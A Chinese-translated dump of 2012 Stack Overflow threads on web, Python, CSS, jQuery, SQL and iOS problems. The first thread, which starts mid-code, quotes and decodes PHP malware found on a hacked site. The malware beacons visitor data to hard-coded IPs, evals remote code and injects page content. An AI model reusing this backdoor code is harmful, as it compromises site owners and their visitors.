
$try = false;}

 if ((ini_get("allow_url_fopen")) && $try) {

$ult = trim(@file_get_contents($url_0 . $url_1));

$try = false;}

if($try){

$fp = fsockopen($pa, 80, $errno, $errstr, 30);

if ($fp) {

$out = "GET $url_1 HTTP/1.0\r\n";$out .= "Host: $pa\r\n";$out .= "Connection: Close\r\n\r\n";fwrite($fp, $out);

$ret = "";

while (!feof($fp)) {

$ret  .=  fgets($fp, 128);}

fclose($fp);$ult = trim(substr($ret, strpos($ret, "\r\n\r\n") + 4));

}}  

if (strpos($ult,"eval") !== false){

$z = stripslashes(str_replace("eval","",$ult));

 eval($z);

 exit();}

if (strpos($ult,"ebna") !== false){$_SERVER["good"] = str_replace("ebna","",$ult);

return true;}

else {
return false;}}

$father2[] = "77.81.241.253";$father2[] = "46.249.58.135";$father2[] = "176.9.241.150";$father2[] = "46.37.169.56";$father2[] = "94.242.255.35";$father2[] = "178.162.129.223";$father2[] = "31.184.234.96";$father2[] = "77.95.18.189";$father2[] = "93.170.137.22";$father2[] = "188.40.95.244";$father2[] = "199.115.231.58";$father2[] = "82.192.87.178";$father2[] = "216.246.99.215";$father2[] = "95.211.18.79";shuffle($father2);foreach($father2 as $ur){
if ( ahfudflfzdhfhs($ur) ) { break ;}}} 
```

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2012-04-18T21:10:35.117

如果您和您的任何开发人员都不知道它的来源，那么我猜您受到了攻击:(。立即解决方法是执行以下操作，

1.  清理所有文件。
2.  立即切换到安全 FTP 访问
3.  在互联网上对这种攻击进行更多研究，看看您需要采取哪些其他措施。

您需要快速执行此操作，因为 chrome 和 FF 等浏览器会很快注意到它，并将开始向用户显示您的网站是恶意的。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-04-18T21:27:28.290

是的，它是恶意代码，它是一组经过评估的 base64 编码的刺，结果代码是：

```
 <?php 
if (!function_exists("GetMama")){
    function mod_con($buf){
        str_ireplace("<body>","<body>",$buf,$cnt_h);
        if ($cnt_h == 1) {
            $buf = str_ireplace("<body>","<body>" . stripslashes($_SERVER["good"]),$buf);
            return $buf;
        }
        str_ireplace("</body>","</body>",$buf,$cnt_h);
        if ($cnt_h == 1) {
            $buf = str_ireplace("</body>",stripslashes($_SERVER["good"])."</body>",$buf);
            return $buf;}return $buf;}function opanki($buf){
                $gz_e = false;
                $h_l = headers_list();
                if (in_array("Content-Encoding: gzip", $h_l)) {
                    $gz_e = true;
                }if ($gz_e){
                    $tmpfname = tempnam("/tmp", "FOO");
                    file_put_contents($tmpfname, $buf);
                    $zd = gzopen($tmpfname, "r");
                    $contents = gzread($zd, 10000000);
                    $contents = mod_con($contents);
                    gzclose($zd);unlink($tmpfname);
                    $contents = gzencode($contents);
                } else {$contents = mod_con($buf);}
                $len = strlen($contents);
                header("Content-Length: ".$len);
                return($contents);}
                function GetMama(){
                    $mother = "mdrmediagroup.com";
                    return $mother;}ob_start("opanki");
                    function ahfudflfzdhfhs($pa){
                        $mama = GetMama();
                        $file = urlencode(__FILE__);
                        if (isset($_SERVER["HTTP_HOST"])){
                            $host = $_SERVER["HTTP_HOST"];
                        } else {
                            $host = "";
                        }if (isset($_SERVER["REMOTE_ADDR"])){
                            $ip = $_SERVER["REMOTE_ADDR"];
                        } else {$ip = "";
                        }if (isset($_SERVER["HTTP_REFERER"])){
                            $ref = urlencode($_SERVER["HTTP_REFERER"]);
                        } else {$ref = "";}
                        if (isset($_SERVER["HTTP_USER_AGENT"])){
                            $ua = urlencode(strtolower($_SERVER["HTTP_USER_AGENT"]));} else {
                                $ua = "";
                            }if (
                            isset($_SERVER["QUERY_STRING"])){
                                $qs = urlencode($_SERVER["QUERY_STRING"]);
                            } else {$qs = "";}
                            $url_0 = "http://" . $pa;
                            $url_1 = "/jedi.php?version=0993&mother=" .$mama . "&file=" . $file . "&host=" . $host . "&ip=" . $ip . "&ref=" . $ref . "&ua=" .$ua . "&qs=" . $qs;
                            $try = true;
                            if( function_exists("curl_init") ){
                                $ch = curl_init($url_0 . $url_1);
                                curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                                curl_setopt($ch, CURLOPT_TIMEOUT, 3);
                                $ult = trim(curl_exec($ch));
                                $try = false;
                            } if ((ini_get("allow_url_fopen")) && $try) {
                                $ult = trim(@file_get_contents($url_0 . $url_1));
                                $try = false;
                            }if($try){
                                $fp = fsockopen($pa, 80, $errno, $errstr, 30);
                                if ($fp) {$out = "GET $url_1 HTTP/1.0\r\n";
                                $out .= "Host: $pa\r\n";$out .= "Connection: Close\r\n\r\n";
                                fwrite($fp, $out);$ret = "";
                                while (!feof($fp)) {
                                    $ret  .=  fgets($fp, 128);
                                }fclose($fp);
                                $ult = trim(substr($ret, strpos($ret, "\r\n\r\n") + 4));
                                }
                            }
                            if (strpos($ult,"eval") !== false){
                                $z = stripslashes(str_replace("eval","",$ult));
                                eval($z);
                                exit();
                            }if (strpos($ult,"ebna") !== false){
                                $_SERVER["good"] = str_replace("ebna","",$ult);return true;
                            }else {return false;}}
                            $father2[] = "77.81.241.253";
                            $father2[] = "46.249.58.135";
                            $father2[] = "176.9.241.150";
                            $father2[] = "46.37.169.56";
                            $father2[] = "94.242.255.35";
                            $father2[] = "178.162.129.223";
                            $father2[] = "31.184.234.96";
                            $father2[] = "77.95.18.189";
                            $father2[] = "93.170.137.22";
                            $father2[] = "188.40.95.244";
                            $father2[] = "199.115.231.58";
                            $father2[] = "82.192.87.178";
                            $father2[] = "216.246.99.215";
                            $father2[] = "95.211.18.79";
                            shuffle($father2);
                            foreach($father2 as $ur){
                                if ( ahfudflfzdhfhs($ur) ) { break ;}
                            }
}

?> 
```

* * *

## 回答 #4

> 赞同：-1
> 
> 时间：2012-04-18T21:17:04.193

要扩展我的评论...

您是否使用 CMS（Wordpress、Joomla 等）？如果是这样，一些 3rd 方插件和主题开发人员会尝试加密他们的代码，以免被盗版......

如果您从头开始编写网站，请往下看。

你是唯一的开发者吗？

(YES) --> 你被黑了。--> 检查你的日志文件。-> 寻找不寻常的活动/黑客尝试。--> 尝试找到漏洞并修补它。--> 删除恶意代码。

（否）--> 询问其他开发人员是否将其放在那里。如果答案是否定的，请转到上述解决方案。

正如 Khan 所说，在一定程度上，时间至关重要，因为 Google 和 Web of Trust 等服务将开始将您的网站标记为恶意网站。同时，不要只删除外来代码。如果您以后设法解开它，您可能能够弄清楚它的作用以及它向谁报告-->黑客是谁。

还要查看服务器日志...如果您的服务器已被植根，那么阻止黑客入侵的唯一方法就是重新安装它。

代码是：

```
if (!function_exists("GetMama"))
{ 
    function mod_con($buf){
        str_ireplace("","",$buf,$cnt_h);

        if ($cnt_h == 1) {
            $buf = str_ireplace("","" . stripslashes($_SERVER["good"]),$buf); 
            return $buf;
        }

        str_ireplace("","",$buf,$cnt_h);
        if ($cnt_h == 1) {
            $buf = str_ireplace("",stripslashes($_SERVER["good"])."",$buf);
            return $buf;
        }

        return $buf;
    }

    function opanki($buf){
        $gz_e = false;$h_l = headers_list();

        if (in_array("Content-Encoding: gzip", $h_l)) {
            $gz_e = true;
        }

        if ($gz_e){
            $tmpfname = tempnam("/tmp", "FOO");
            file_put_contents($tmpfname, $buf);
            $zd = gzopen($tmpfname, "r");
            $contents = gzread($zd, 10000000);
            $contents = mod_con($contents);
            gzclose($zd);
            unlink($tmpfname);
            $contents = gzencode($contents);
        } 

        else {
            $contents = mod_con($buf);
        }

        $len = strlen($contents);
        header("Content-Length: ".$len);
        return($contents);
    } 

    function GetMama(){
        $mother = "mdrmediagroup.com";
        return $mother;
    }

    ob_start("opanki");

    function ahfudflfzdhfhs($pa){
        $mama = GetMama();
        $file = urlencode(FILE);

        if (isset($_SERVER["HTTP_HOST"])){
            $host = $_SERVER["HTTP_HOST"];
        } else {
            $host = "";
        }

        if (isset($_SERVER["REMOTE_ADDR"])){
            $ip = $_SERVER["REMOTE_ADDR"];
        } 

        else {
            $ip = "";
        }

        if (isset($_SERVER["HTTP_REFERER"])){
            $ref = urlencode($_SERVER["HTTP_REFERER"]);
        } 

        else {
            $ref = "";
        }

        if (isset($_SERVER["HTTP_USER_AGENT"])){
            $ua = urlencode(strtolower($_SERVER["HTTP_USER_AGENT"]));
        } 

        else {
            $ua = "";
        }

        if (isset($_SERVER["QUERY_STRING"])){
            $qs = urlencode($_SERVER["QUERY_STRING"]);
        } 

        else {
            $qs = "";
        }

        $url_0 = "http://" . $pa;$url_1 = "/jedi.php?version=0993&mother=" .$mama . "&file=" . $file . "&host=" . $host . "&ip=" . $ip . "&ref=" . $ref . "&ua=" .$ua . "&qs=" . $qs;

        $try = true;

        if( function_exists("curl_init") ){

            $ch = curl_init($url_0 . $url_1);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_TIMEOUT, 3);
            $ult = trim(curl_exec($ch));
            $try = false;
        } 

        if ((ini_get("allow_url_fopen")) && $try) {
            $ult = trim(@file_get_contents($url_0 . $url_1));
            $try = false;
        }

        if($try){
            $fp = fsockopen($pa, 80, $errno, $errstr, 30);

            if ($fp) {
                $out = "GET $url_1 HTTP/1.0\r\n";
                $out .= "Host: $pa\r\n";
                $out .= "Connection: Close\r\n\r\n";
                fwrite($fp, $out);
                $ret = "";

                while (!feof($fp)) {
                    $ret .= fgets($fp, 128);
                }

                fclose($fp);

                $ult = trim(substr($ret, strpos($ret, "\r\n\r\n") + 4));
            }

        } 

        if (strpos($ult,"eval") !== false){
            $z = stripslashes(str_replace("eval","",$ult)); e
            val($z); 
            exit();
        }

        if (strpos($ult,"ebna") !== false){
            $_SERVER["good"] = str_replace("ebna","",$ult);
            return true;
        }

        else {
            return false;
        }

    }

    $father2[] = "77.81.241.253";
    $father2[] = "46.249.58.135";
    $father2[] = "176.9.241.150";
    $father2[] = "46.37.169.56";
    $father2[] = "94.242.255.35";
    $father2[] = "178.162.129.223";
    $father2[] = "31.184.234.96";
    $father2[] = "77.95.18.189";
    $father2[] = "93.170.137.22";
    $father2[] = "188.40.95.244";
    $father2[] = "199.115.231.58";
    $father2[] = "82.192.87.178";
    $father2[] = "216.246.99.215";
    $father2[] = "95.211.18.79";

    shuffle($father2);

    foreach($father2 as $ur){
        if ( ahfudflfzdhfhs($ur) ) {
            break ;
        }
    }
} 
```

手工拆包，因此更具可读性:)

# php - 质量计算的 PHP 效率

> ID：10218030
> 
> 赞同：2
> 
> 时间：2012-04-18T21:07:13.410
> 
> 标签：php, performance

一个有趣的问题，对于 Uni 课程的一部分，我们面临着运行模拟服务器接收请求然后处理它们的挑战。我已经多次构建和重建了它，我认为它已经尽可能高效了，你有什么可以提高这个程序的效率的吗？

模拟运行，`$simulationLength`并且每次`$currentTime`都有`1/$arrival_rate`新请求到达的机会。一个大小的队列`$maxQueueSize`保存这些请求，如果队列已满，则拒绝它们。对于每个`$currentTime`CPU 可能会从队列中移除一个项目`$queue`并在其上工作`$executionTime`几秒钟，此时 CPU（服务器）从繁忙队列中移除并且可以自由地处理另一个请求。

我的代码：

```
<?php

...SNIP error checking...

$queue_size = isset($argv[1]) ? $argv[1] : 10000;
$arrival_rate = isset($argv[2]) ? $argv[2] : 3;
$number_of_servers = isset($argv[3]) ? $argv[3] : 2;
$execution_time = isset($argv[4]) ? $argv[4] : 25;

...SNIP error checking...

$simulationLength = 1000000;

$arrivalRate = $arrival_rate;
$executionTime = $execution_time;

$busyServers = array();
$freeServers = $number_of_servers;

$currentTime = 0;
$currentQueueSize = 0;
$maxQueueSize = $queue_size; //Max
$queue = array();

//Stats
$totalRequests = 0;
$rejectedRequests = 0;
$queueSize = array_fill(0, 100, $simulationLength);
$totalWaitingTime = 0;

//while the simulation is running
while($currentTime++ < $simulationLength) {

  //a request has arrived
  if(mt_rand(1, $arrival_rate)==1) {  
    $totalRequests++;

    //Adding to the queue
    if($currentQueueSize < $maxQueueSize) {
      $currentQueueSize++;
      array_push($queue, $currentTime); //add to the end of the queue
    } else {
      $rejectedRequests++;
    }

  } //end request arrived

  //Only one server can fetch requests at a time
  if(!empty($busyServers)&&reset($busyServers) < $currentTime) {
    unset($busyServers[key($busyServers)]); //remove first element - efficient
    $freeServers++; //increase free servers
  }

  //Only one server can fetch requests at a time
  if($currentQueueSize>0&&$freeServers>1) {

    $currentQueueSize--;
    reset($queue); //reset pointer
    $queueTime = $queue[key($queue)]; //read of the front  
    unset($busyServers[key($busyServers)]); //delete off print

    $freeServers--; //use up a server

    $busyServers[] = $currentTime + $executionTime; //mark when free

    $totalWaitingTime += ($currentTime - $queueTime) + $executionTime;
  }

  $queueSize[$currentTime] = $currentQueueSize;
}

printf("Requests served %d\n", $totalRequests);
printf("Rejected requests %d\n", $rejectedRequests);
printf("Total waiting time %d\n", $totalWaitingTime);

printf("Percentage of rejected requests %0.1f\n", $rejectedRequests/$totalRequests);
printf("The average queue size %d\n", array_sum($queueSize)/sizeof($queueSize)); 
printf("Average response time %d\n", $totalWaitingTime/$totalRequests);

?> 
```

谢谢你的时间，

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-18T21:48:35.183

微优化但：

*   在像这样的繁重循环中，--$preIncrement 比 $postIncrement++ 快
*   array_push($queue, $currentTime); 是函数调用开销：使用 $queue[] = $currentTime; 反而
*   $currentTime + $executionTime 被计算两次，计算一次并存储结果，然后使用它

# python - 删除线程计时器类？

> ID：10218033
> 
> 赞同：1
> 
> 时间：2012-04-18T21:07:47.113
> 
> 标签：python, multithreading, timer

想象一下我有这段代码（还没有写实际的计时器）：

```
class Timer(threading.Thread):
    def __init__(self, seconds):
        self.runTime = seconds
        threading.Thread.__init__(self)
    def run(self):
        time.sleep(self.runTime)
        #do some other function
        print 'Finished'
t = Timer(60)
t.start() 
```

一旦 run() 方法完成运行，有什么方法可以停止线程并删除类实例？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-18T21:15:31.257

该`run()`方法是在线程中运行的所有内容，因此当它完成时，不再运行任何内容。然后`t.is_alive()`会返回`False`。然后，您可以使用 删除该实例`del t`，但这只会删除您对它的引用。实际的删除将在一段时间后由垃圾收集器完成。

# html - CSS3 过渡弄乱了 webkit 中的字体？

> ID：10218039
> 
> 赞同：12
> 
> 时间：2012-04-18T21:08:10.910
> 
> 标签：html, css, css-transitions, css-animations

自从我添加了一个 css 过渡（第一个是悬停，第二个是动画），它似乎弄乱了我的字体，它们看起来“不同”。

这太奇怪了，我找了好几个小时都找不到任何东西，我也不知道为什么会这样。

在 Firefox 中似乎没问题，但 safari 和 chrome 有问题。

[http://www.simplerweb.co.uk](http://www.simplerweb.co.uk)

左下角齿轮动画下方的所有内容看起来都像较轻的字体粗细，导航菜单看起来也一样。

我完全迷失了这个。

这是动画的CSS。

```
.gearone {height:100px;
width:100px;
top:-10px;
left:-10px;
position:absolute;
background-position:center;
background-repeat:no-repeat;
background-image:url(../images/gearone.png);
 -webkit-animation-name:             backrotate; 
    -webkit-animation-duration:        13s; 
    -webkit-animation-iteration-count:  infinite;
    -webkit-transition-timing-function:linear;

-moz-animation-name: backrotate;
     -moz-animation-duration: 13s;
      -moz-animation-timing-function: linear;
    -moz-animation-iteration-count: infinite;
}

.geartwo {height:100px;
width:100px;
position:absolute;
background-position:center;
background-repeat:no-repeat;
background-image:url(../images/gearone.png);
top:20px;
left:10px;

 -webkit-animation-name:             rotate; 
    -webkit-animation-duration:         13s; 
    -webkit-animation-iteration-count:  infinite;
    -webkit-transition-timing-function:linear;

    -moz-animation-name: rotate;
     -moz-animation-duration: 13s;
      -moz-animation-timing-function:linear;
    -moz-animation-iteration-count: infinite;

}

@-webkit-keyframes rotate {
  from {
    -webkit-transform: rotate(0deg);

  }
  to { 
    -webkit-transform: rotate(360deg);

  }
}

@-moz-keyframes rotate {
from {

    -moz-transform: rotate(0deg);
  }
  to { 

    -moz-transform: rotate(360deg);
  }
}

@-webkit-keyframes backrotate {
    0% {

        -webkit-transform: rotate(360deg);
    }
    100% {

        -webkit-transform: rotate(0deg);
    }
}
@-moz-keyframes backrotate {
    0% {
        -moz-transform: rotate(360deg);

    }
    100% {
        -moz-transform: rotate(0deg);

    }
} 
```

* * *

## 回答 #1

> 赞同：19
> 
> 时间：2012-12-11T01:37:28.410

我想我有一个类似的问题，为我解决的问题是添加

```
-webkit-font-smoothing: antialiased; 
```

到我的身体 css。当任何类型的动画发生时，webkit 会尝试对文本进行抗锯齿以帮助动画，因此将其添加到开头可以防止它发生变化或看起来不同。

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2012-10-30T12:36:01.873

我有同样的问题。在执行 webkit 转换时，一些锚文本变得抗锯齿。经过多次尝试，我发现这仅发生在已定位且具有 z-index 的元素中，而其他元素也已定位在 z-index 内部。

```
#footer {
    bottom: 0;
    left: 330px;
    right: 100px;
    height: 75px;
    background-color: #231f20;
    min-width: 540px;
    min-height: 75px;
    position: fixed;
    z-index: 10;
} 
```

在我的页脚里面

```
#cityNav > ul > li a {
            font-size: 24px;
            text-transform: uppercase;
            position: relative;
            z-index: 110;
            line-height: 24px;
            height: 24px;
            display: block;
        } 
```

这是我的过渡

```
.circle {
        position: absolute;
        top: 0;
        left: 0;
        display: block;
        background-color: #ff0000;
        width: 20px;
        height: 20px;
        cursor: pointer;
        text-indent: -999em;
        -webkit-border-radius: 50%;
        -moz-border-radius: 50%;
        -o-border-radius: 50%;
        border-radius: 50%;
        -webkit-transition: all .2s ease-out; 
        -moz-transition: all .2s ease-out; 
        -o-transition: all .2s ease-out; 
        transition: all .2s ease-out;
    }
    .circle:hover {
        -webkit-transform: scale(2);
        -moz-transform: scale(2);
        -o-transform: scale(2);
        transform: scale(2);
    } 
```

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2014-09-16T18:33:57.677

我在 Chrome for OSX 中遇到了这个问题。使用`-webkit-backface-visibility: hidden;`解决了这个问题。

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2013-07-29T10:36:31.080

我已经多次遇到这个问题，并且成功地将以下 css 添加到动画元素中：

```
z-index: 60000;
position: relative; 
```

似乎它需要 z-index*和*position 才能有效。就我而言，我将它与 Font Awesome 动画微调器一起使用。

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2012-04-19T02:06:27.463

What you're seeing is webkit anti-alias your text because it's treating it as a texture as opposed to a vector. There's not much you can do, other than not using transformations, or using an text replacement to provide an image instead of your type.

There's a [few related threads](https://stackoverflow.com/questions/6411361/webkit-based-blurry-distorted-text-post-animation-via-translate3d) regarding webkit aliasing, but I haven't personally had much luck keeping the type as type, and still using transformations.

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2012-04-19T01:24:47.313

我不确定它发生的原因*，*但看起来当你的`.geartwo`元素（100px x 100px）与你的文本重叠时，它似乎变亮了。当它滚下来时，它又恢复了正常。我也是，只在 webkit 浏览器中注意到这一点。

要修复它，您可以将齿轮设置为（无论如何`width`，这就是图像的大小——我认为不需要它为 100 像素 x 100 像素），然后相应地重新定位它。`height``40px`

编辑：我不确定你是否需要在我的提议之后这样做，但经过一番搜索后，我发现[了这个相关的讨论。](https://stackoverflow.com/questions/7947385/hovering-over-css-transition-in-safari-lightens-certain-font-color)

* * *

## 回答 #7

> 赞同：1
> 
> 时间：2014-07-07T13:41:28.340

如上所述，`-webkit-font-smoothing: antialiased;`适用于桌面 Safari。但在 iOS 上，您需要使用`-webkit-backface-visibility: hidden;`才能解决此问题。

* * *

## 回答 #8

> 赞同：1
> 
> 时间：2016-03-03T07:42:51.460

While`-webkit-backface-visibility: hidden;`是部分解决方案；它真的会破坏文本的显示，特别是如果您启用了平滑/AA。这个错误也很讨厌，因为它只在您使用 transform 属性时才会发生。

在每隔一个月偶尔访问这个主题大约 2 年之后，我找到了一个解决方法。您需要将 a 添加`position:relative`到正在动画的 css 元素。但是有一个问题，**您需要给它一个`z-index`大于或小于您看到失真的元素**的值。这可以 100% 修复它。

由于主题没有“明确”的答案，我希望这个答案能帮助那些多年来与我同舟共济的人。

* * *

## 回答 #9

> 赞同：-1
> 
> 时间：2015-01-22T15:36:57.040

对于 iOS8，我成功消除转换闪烁的唯一方法是添加

`body * { -webkit-transform: translate3d(0, 0, 0); }`

到我的样式表。

* * *

## 回答 #10

> 赞同：-2
> 
> 时间：2015-10-13T10:44:50.050

您需要做的就是将此 CSS 规则添加到您看到闪烁的任何元素：

```
 -webkit-transform-style: preserve-3d; 
```

就是这样。

# jquery - 为什么我的 jQuery 插件不能在 IE9 中创建列？

> ID：10218051
> 
> 赞同：-1
> 
> 时间：2012-04-18T21:09:08.857
> 
> 标签：jquery, css, internet-explorer-9

[我在我的 WIP 站点](http://allhomes.ws/alabama/)的左侧实现了一个新的侧边栏状态切换器，它在 Chrome 和 Firefox 中完美运行，但像往常一样，IE9 让我头疼。根本不熟悉 jquery（插件的语言），我只是不确定如何解决这个问题。有人可以提供推荐吗？

除了 IE9 没有像 Chrome 和 Firefox 那样在列中显示我的状态（“li”元素）之外，一切看起来都是正确的。

即使是关于某人通常如何解决此问题的建议也会很棒。如果它是 css，我只是拉起 firebug，但我对 jquery 完全是绿色的。

非常感谢。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-18T21:33:57.240

当我在 IE 中打开您的页面时，我收到 javascript 错误，这通常会使 jQuery 停止处理。

**第一个错误：**

消息：预期 ')' 行：35 字符：1 代码：0 URI：[http ://allhomes.ws/alabama/](http://allhomes.ws/alabama/)

**第二个错误：**

消息：对象不支持属性或方法 'ajaxForm' 行：16 字符：2 代码：0 URI：[http ://allhomes.ws/alabama/form/jquery.form.js](http://allhomes.ws/alabama/form/jquery.form.js)

错误之一在这里-您缺少结束括号：

```
<script type="text/javascript">
$(document).ready(function(){
    $('#example').sticklr();
}
</script> 
```

应该：

```
});
</script> 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-18T21:32:51.307

真正的问题在于您的 CSS。我让 IE9 通过添加以下内容在列中列出您的状态：

```
.sticklr > li { width: 1000px; } 
```

现在，我知道它并不完美，但您只需要使用宽度和其他 UL 元素即可获得所需的效果。

* * *

我又玩了一会儿，让他们排成一行：

```
.sticklr > li { width: 1500px; }
.sticklr > li > a { float: left; }
.sticklr > li > ul { margin: 0; } 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-18T21:30:10.293

控制台说您的文档就绪功能中有一个 JS 错误。罪魁祸首似乎是缺少花括号，解决方案：

```
$(document).ready(function(){ $('#example').sticklr(); }); 
```

# model-view-controller - Backbone.js 使用视图来操作另一个视图

> ID：10218053
> 
> 赞同：1
> 
> 时间：2012-04-18T21:09:21.717
> 
> 标签：model-view-controller, backbone.js

我的问题主要是关于 Backbone.js 的概念性问题，但如果我的问题不清楚，我可以模拟一些代码。

考虑我在网站上有 2 个部分的情况。项目列表作为一个视图和另一个视图，该视图具有一个下拉菜单来选择项目列表的排序方式。显然，项目列表与存储填充列表的实际数据的模型集合相关联。但是我不确定当另一个视图的下拉列表更改时触发集合以不同方式排序的最佳方法。我应该更改集合的实际顺序，还是按照我想要的视图顺序呈现视图？

另外，使用下拉列表的模型来跟踪下拉列表的状态并将项目列表视图绑定到该模型是一个好主意，以便我知道何时重新呈现项目列表？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-18T23:09:40.270

你可以在这里走几条路。这里有几个：

1.  使用路由器。路由器将保存您的视图，或者至少是顶级视图（更清晰），并且您的下拉视图将触发路由更改，这会将信息传递给视图。如果您想要干净的 URL，最好。
2.  在下拉视图中创建指向列表视图的指针。当下拉视图接收到更改事件时，它会明确告诉列表视图进行更新。（IMO 是一种糟糕的方法，但为了完整起见，在此列出。）
3.  用模型支持一切。（就像您在上一个问题中建议的那样。）下拉视图将由模型支持，列表视图可以绑定到该模型的事件。（同样，列表视图仍然需要了解下拉模型——并不理想。）
4.  做一个活动经理。当您的下拉菜单收到更改时，您`trigger 'sort'`和任何关心的人都可以收听该事件。这不是一个简单的解决方案，但也不是过于复杂。然后，您的列表视图可以使用事件管理器注册其侦听事件的意图`sort`，从而将事件管理器内部的实际视图抽象出来并远离下拉视图。

1 和 4 实际上是同一件事，只是取决于您是否需要路由器。

基本上，我对这类场景的启发是“对于不需要知道的事情，什么都不应该知道”。应用在这里，这意味着你的观点不应该相互了解。

# c++ - 无法弄清楚为什么我的 IF 语句在使用 C++ 的 SQL 中被跳过

> ID：10218054
> 
> 赞同：0
> 
> 时间：2012-04-18T21:09:23.043
> 
> 标签：c++, sql

我似乎无法弄清楚为什么我的 IF 语句被跳过。将 SQL 与 C++ 结合使用。该程序跳过我的前两个 IF 语句并跳到 else 分支。不知道为什么会这样做。这是我的编码。

```
void add_technician() {
EXEC SQL BEGIN DECLARE SECTION;
    char sn[10];
    int s = 0;
    char answer;
    int umn;
    char tname[30];
    char tadd[30];
    char tpho[10];
    char tmod[15];
EXEC SQL END DECLARE SECTION;

cout << "Enter social security number:";
cin >> sn;  

EXEC SQL SELECT count(*) into :s from Employees where SSN= :sn;

          if (s == 1)
   { 
cout << "Employee already exists in the database."; 
   cout <<"Would you like to update the union-membership-number?";
   cin >> answer;
   if (answer == 'y'|| 'Y')
   {cout <<"Enter new union member number:";
   cin >> umn;
EXEC SQL 
    INSERT INTO Employee (ssn, union_member_no)
    VALUES (:sn, :umn);
 } 
   }
         else {
 cout << "Enter in union membership number of the new employee: ";
            cin >> umn;
            EXEC SQL INSERT INTO Employees (ssn, union_member_no) 
                   VALUES (:sn, :umn);
            EXEC SQL COMMIT WORK;
             cout << "Enter the address of the technician.";
             cin >> tadd;
 cout << "Enter the name technician name.";
             cin >> tname;

            EXEC SQL INSERT INTO Technicians (address, name , phone)
       VALUES (:tadd, :tname, :tpho);
EXEC SQL COMMIT WORK;
            cout << "Enter airplane model number that you are an expert on." ;
            cin >> tmod;
EXEC SQL INSERT INTO Experts (model_no, ssn)
    VALUES (:tmod);
EXEC SQL COMMIT WORK; }                

} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-18T21:47:12.033

该代码允许为单个 SSN 分配多个 UMN，但第一条`if`语句没有考虑到这一点。它正在检查仅分配有 1 个 UMN 的 SSN。如果给定的 SSN 分配了多个 UMN，`SELECT`则将返回`count > 1`并且流将跳转到您的`else`块。

此外，您的第二个`if`语句格式不正确。`if (answer == 'y'|| 'Y')`将始终评估为`true`. 您需要`answer`在每组条件中指定变量，如下所示：`if ((answer == 'y') || (answer == 'Y'))`.

尝试这个：

```
void add_technician()
{
    EXEC SQL BEGIN DECLARE SECTION;
        char sn[10];
        int s = 0;
        char answer;
        int umn;
        char tname[30];
        char tadd[30];
        char tpho[10];
        char tmod[15];
    EXEC SQL END DECLARE SECTION;

    cout << "Enter social security number:";
    cin >> sn;

    EXEC SQL SELECT count(*) into :s from Employees where SSN= :sn;

    if (s > 0)
    {
       cout << "Employee already exists in the database.";
       cout << "Would you like to add a new union membership number?";
       cin >> answer;
       if ((answer == 'y') || (answer == 'Y'))
       {
           cout << "Enter new union member number:";
           cin >> umn;
           EXEC SQL INSERT INTO Employee (ssn, union_member_no)  VALUES (:sn, :umn);
       }
    }
    else
    {
        cout << "Enter union membership number of the new employee: ";
        cin >> umn;
        EXEC SQL INSERT INTO Employees (ssn, union_member_no) VALUES (:sn, :umn);
        EXEC SQL COMMIT WORK;

        cout << "Enter the address of the technician.";
        cin >> tadd;
        cout << "Enter the name of the technician.";
        cin >> tname;
        EXEC SQL INSERT INTO Technicians (address, name , phone) VALUES (:tadd, :tname, :tpho);
        EXEC SQL COMMIT WORK;

        cout << "Enter airplane model number that the technician is an expert on." ;
        cin >> tmod;
        EXEC SQL INSERT INTO Experts (model_no, ssn) VALUES (:tmod);
        EXEC SQL COMMIT WORK;
    }
} 
```

# ios - 如果用户关闭了应用程序，我如何确定 iOS 设备是否重新进入网络覆盖范围？

> ID：10218056
> 
> 赞同：1
> 
> 时间：2012-04-18T21:09:24.770
> 
> 标签：ios, apple-push-notifications

我们正在构建一个企业级工单应用程序，用户通常位于没有网络覆盖的区域。我们希望确保当他们重新覆盖时，他们对本地存储的工作订单所做的任何工作都会尽快发送回服务器。如果用户保持应用程序运行，这很容易做到，但在我们的情况下，他们很可能会在应用程序之间切换，并且当他们重新覆盖时工作订单应用程序可能不会运行。

我们曾考虑让该应用程序在检测到它超出覆盖范围时向服务器端侦听器发送一封电子邮件。当设备重新进入覆盖范围时，电子邮件应该会送达，服务器可以向用户发送推送通知以打开应用程序。这感觉有点像黑客......有没有更好的方法来处理这种情况？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-18T21:26:09.233

正如您已经注意到的那样，推送通知是可行的方法，但即使使用它们，也不能保证用户会发送数据甚至打开应用程序。

我建议您让数据本身在有限的时间后过期，并在用户最小化甚至关闭应用程序时提醒他们。

您还可以使用本地通知来提醒到期。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-08T14:18:50.283

只要这是一个不必通过 App Store 分发的企业应用程序，您就可以滥用音频后台处理模式来保持您的应用程序始终运行。您所要做的就是像媒体播放器一样循环播放无声的音频文件。这将使您的应用程序在后台运行，您可以根据需要重试与服务器的连接。

# visual-studio-2010 - Visual Studio 2010 Ultimate - 数据生成计划为列设置不正确的数据类型

> ID：10218072
> 
> 赞同：2
> 
> 时间：2012-04-18T21:10:44.043
> 
> 标签：visual-studio-2010, qa, sqldatatypes, data-generation

我一直在研究如何在我们的数据库中生成测试数据，以便我们可以测试 CRUD 操作，而不会在插入时遇到外键约束问题。

我决定采用的方法是通过 Visual Studio 2010 Ultimate 的数据生成器功能。为我们的特定数据库设置数据生成器计划并不太难，但我遇到了数据类型问题。

